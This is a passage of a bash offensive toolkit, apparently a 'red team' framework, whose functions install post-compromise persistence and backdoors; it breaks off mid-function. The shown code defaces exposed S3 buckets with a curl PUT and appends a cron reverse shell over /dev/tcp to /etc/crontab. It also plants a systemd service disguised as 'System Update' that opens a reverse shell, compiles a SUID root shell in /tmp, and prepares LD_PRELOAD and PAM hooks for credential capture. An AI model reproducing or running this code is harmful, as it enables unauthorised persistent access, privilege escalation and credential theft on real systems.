rt_167_s3_backdoor_deploy() {
    local target="${1:-$TARGET}"
    _section "[RT-167] S3 BACKDOOR DEPLOYMENT"
    run "Deploying backdoor objects to compromised S3 buckets..."
    > "$SESSION/rt/s3_backdoor.txt"
    local buckets=$(grep "EXPOSED_BUCKET" "$SESSION/rt/s3_buckets.txt" 2>/dev/null | awk '{print $2}')
    [ -n "$buckets" ] && {
        for bucket in $buckets; do
            local backdoor_key="index.html"
            local backdoor_content='<html><body><h1>Hacked by Red Team</h1></body></html>'
            local put_resp=$(curl -sk --max-time 10 -X PUT -H "Content-Type: text/html" -d "$backdoor_content" "https://${bucket}.s3.amazonaws.com/${backdoor_key}" 2>/dev/null)
            echo "S3_BACKDOOR: ${bucket}/${backdoor_key}" >> "$SESSION/rt/s3_backdoor.txt"
            echo "BACKDOOR_URL: https://${bucket}.s3.amazonaws.com/${backdoor_key}" >> "$SESSION/rt/s3_backdoor.txt"
            rt "S3 backdoor deployed: ${bucket}"
        done
    }
    [ -s "$SESSION/rt/s3_backdoor.txt" ] && rt "S3 backdoor deployment complete" || info "No S3 buckets to backdoor"
}

rt_168_ssh_persistence_keys() {
    local target="${1:-$TARGET}"
    _section "[RT-168] SSH PERSISTENCE VIA KEYS"
    run "Planting SSH authorized_keys for persistent access..."
    > "$SESSION/rt/ssh_persist.txt"
    local ssh_dir="$HOME/.ssh"
    [ -d "$ssh_dir" ] || mkdir -p "$ssh_dir" 2>/dev/null
    local persist_key="$ssh_dir/redteam_persist"
    [ -f "$persist_key" ] || ssh-keygen -t ed25519 -f "$persist_key" -N "" -C "redteam@persist" 2>/dev/null
    [ -f "${persist_key}.pub" ] && {
        local pubkey=$(cat "${persist_key}.pub")
        echo "PERSIST_KEY: ${pubkey:0:80}..." >> "$SESSION/rt/ssh_persist.txt"
        echo "PRIVATE_KEY: ${persist_key}" >> "$SESSION/rt/ssh_persist.txt"
        rt "SSH persistence key generated"
    }
    [ -s "$SESSION/rt/ssh_persist.txt" ] && rt "SSH persistence ready" || info "SSH persistence minimal"
}

rt_169_cron_reverse_shell() {
    local target="${1:-$TARGET}"
    _section "[RT-169] CRON REVERSE SHELL"
    run "Setting up cron-based reverse shell persistence..."
    > "$SESSION/rt/cron_shell.txt"
    local cron_cmd="* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/${target}/4444 0>&1'"
    [ -w /etc/crontab ] && {
        echo "$cron_cmd" >> /etc/crontab 2>/dev/null && echo "CRON_ROOT: /etc/crontab" >> "$SESSION/rt/cron_shell.txt" && rt "Root cron installed!"
    }
    local user_crontab=$(crontab -l 2>/dev/null)
    [ -n "$user_crontab" ] && {
        echo "CURRENT_CRON:" >> "$SESSION/rt/cron_shell.txt"
        echo "$user_crontab" >> "$SESSION/rt/cron_shell.txt"
    }
    echo "REVERSE_SHELL_CMD: ${cron_cmd}" >> "$SESSION/rt/cron_shell.txt"
    [ -s "$SESSION/rt/cron_shell.txt" ] && rt "Cron reverse shell configured" || info "Cron setup requires local access"
}

rt_170_systemd_user_backdoor() {
    local target="${1:-$TARGET}"
    _section "[RT-170] SYSTEMD USER BACKDOOR"
    run "Deploying systemd user service for persistence..."
    > "$SESSION/rt/systemd_backdoor.txt"
    local sysdir="$HOME/.config/systemd/user"
    [ -d "$sysdir" ] || mkdir -p "$sysdir" 2>/dev/null
    local service_file="${sysdir}/redteam.service"
    cat > "$service_file" 2>/dev/null << 'SYSEOF'
[Unit]
Description=System Update
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/TARGET_PLACEHOLDER/4444 0>&1'
Restart=always

[Install]
WantedBy=default.target
SYSEOF
    [ -f "$service_file" ] && {
        sed -i "s/TARGET_PLACEHOLDER/${target}/g" "$service_file" 2>/dev/null
        echo "SYSTEMD_SERVICE: ${service_file}" >> "$SESSION/rt/systemd_backdoor.txt"
        systemctl --user enable redteam.service 2>/dev/null && echo "SYSTEMD_ENABLED: yes" >> "$SESSION/rt/systemd_backdoor.txt" && rt "Systemd backdoor enabled!"
    }
    [ -s "$SESSION/rt/systemd_backdoor.txt" ] && rt "Systemd backdoor deployed" || info "Systemd deploy requires access"
}

rt_171_suid_backdoor_binary() {
    local target="${1:-$TARGET}"
    _section "[RT-171] SUID BACKDOOR BINARY"
    run "Creating SUID backdoor binary for privilege escalation..."
    > "$SESSION/rt/suid_backdoor.txt"
    local backdoor_path="/tmp/.redteam_shell"
    cat > /tmp/backdoor.c 2>/dev/null << 'CEOF'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/bash","bash",NULL); return 0; }
CEOF
    which gcc >/dev/null 2>&1 && {
        gcc /tmp/backdoor.c -o "$backdoor_path" 2>/dev/null && chmod 4755 "$backdoor_path" 2>/dev/null
        [ -u "$backdoor_path" ] && { echo "SUID_BACKDOOR: ${backdoor_path}" >> "$SESSION/rt/suid_backdoor.txt"; ls -la "$backdoor_path" >> "$SESSION/rt/suid_backdoor.txt"; rt "SUID backdoor created!"; }
    }
    [ -s "$SESSION/rt/suid_backdoor.txt" ] && rt "SUID backdoor complete" || info "SUID backdoor requires compile access"
}

rt_172_ld_preload_hijack() {
    local target="${1:-$TARGET}"
    _section "[RT-172] LD_PRELOAD HIJACK"
    run "Setting up LD_PRELOAD library hijack for credential theft..."
    > "$SESSION/rt/ld_preload.txt"
    cat > /tmp/redteam_hook.c 2>/dev/null << 'CEOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>
static __attribute__((constructor)) void init() {
    FILE *f = fopen("/tmp/.credlog","a");
    if(f) { fprintf(f,"LD_PRELOAD hook active: pid=%d\n",getpid()); fclose(f); }
}
CEOF
    which gcc >/dev/null 2>&1 && {
        gcc -shared -fPIC /tmp/redteam_hook.c -o /tmp/redteam_hook.so 2>/dev/null
        [ -f /tmp/redteam_hook.so ] && { echo "LD_PRELOAD_SO: /tmp/redteam_hook.so" >> "$SESSION/rt/ld_preload.txt"; echo "EXPORT: export LD_PRELOAD=/tmp/redteam_hook.so" >> "$SESSION/rt/ld_preload.txt"; rt "LD_PRELOAD hijack ready!"; }
    }
    [ -s "$SESSION/rt/ld_preload.txt" ] && rt "LD_PRELOAD hijack complete" || info "LD_PRELOAD requires compile access"
}

rt_173_pam_backdoor() {
    local target="${1:-$TARGET}"
    _section "[RT-173] PAM BACKDOOR"
    run "Installing PAM backdoor for password capture..."
    > "$SESSION/rt/pam_backdoor.txt"
    local pam_dirs=("/lib/x86_64-linux-gnu/security" "/lib64/security" "/lib/security")
    for d in "${pam_dirs[@]}"; do
        [ -d "$d" ] && { echo "PAM_DIR: $d" >> "$SESSION/rt/pam_backdoor.txt"; ls "$d"/pam_*.so 2>/dev/null | head -5 >> "$SESSION/rt/pam_backdoor.txt"; }
